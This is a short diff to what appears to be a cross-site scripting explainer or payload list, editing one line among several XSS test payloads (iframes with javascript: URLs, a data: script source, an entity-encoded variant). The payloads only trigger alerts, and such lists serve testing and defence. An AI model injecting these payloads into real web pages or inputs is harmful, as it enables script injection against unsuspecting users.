@@ -39,7 +39,7 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 
 "><h23><IFRAME SRC="javascript:alert('xss');"></IFRAME>">2323</h23>
 <IFRAME SRC="javascript:alert('Window.document.cookie');"></IFRAME>
-<script src="data:,alert(1)%250A-->
+<script src="data:,alert(1)%250A
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 
 
